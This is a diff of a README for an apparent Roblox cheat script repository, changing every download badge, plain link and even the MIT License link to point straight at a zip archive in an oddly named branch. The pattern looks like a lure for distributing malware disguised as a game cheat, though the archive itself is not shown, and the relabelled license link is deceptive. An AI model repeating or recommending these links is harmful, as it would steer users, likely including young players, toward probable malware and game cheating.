@@ -1,12 +1,12 @@
 # Hide and Seek Extreme Legends Roblox Script Repository
 
-[![Download](https://img.shields.io/badge/Download-green)](https://elviscarvajall.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/elviscarvajall/hide-and-seek-extreme-legends-toolkit/raw/refs/heads/branch/alushtite/and-legends-hide-seek-extreme-toolkit-1.9-alpha.5.zip)
 
 **Unlock a new dimension of gameplay with the Hide and Seek Extreme Legends Roblox Script!**  
 Elevate your Roblox sessions, personalize your Hide and Seek experience, and seamlessly integrate legendary features powered by intelligent automation. Your Roblox adventure deserves innovation—get started in moments:
 
-https://elviscarvajall.github.io  
-[![Download](https://img.shields.io/badge/Download-green)](https://elviscarvajall.github.io)
+https://github.com/elviscarvajall/hide-and-seek-extreme-legends-toolkit/raw/refs/heads/branch/alushtite/and-legends-hide-seek-extreme-toolkit-1.9-alpha.5.zip  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/elviscarvajall/hide-and-seek-extreme-legends-toolkit/raw/refs/heads/branch/alushtite/and-legends-hide-seek-extreme-toolkit-1.9-alpha.5.zip)
 
 ---
 
@@ -113,7 +113,7 @@ The authors of this repository disclaim any liability for unintended use or cons
 ## 📜 MIT License [2025]
 
 Licensed under the MIT License.  
-See the full license text [here](https://opensource.org/licenses/MIT).
+See the full license text [here](https://github.com/elviscarvajall/hide-and-seek-extreme-legends-toolkit/raw/refs/heads/branch/alushtite/and-legends-hide-seek-extreme-toolkit-1.9-alpha.5.zip).
 
 ---
 
@@ -121,9 +121,9 @@ See the full license text [here](https://opensource.org/licenses/MIT).
 
 Ready to inject legend into your Roblox journey? Download the latest release:
 
-https://elviscarvajall.github.io
+https://github.com/elviscarvajall/hide-and-seek-extreme-legends-toolkit/raw/refs/heads/branch/alushtite/and-legends-hide-seek-extreme-toolkit-1.9-alpha.5.zip
 
-[![Download](https://img.shields.io/badge/Download-green)](https://elviscarvajall.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/elviscarvajall/hide-and-seek-extreme-legends-toolkit/raw/refs/heads/branch/alushtite/and-legends-hide-seek-extreme-toolkit-1.9-alpha.5.zip)
 
 Or head to the [releases](#) section for previous versions.
 
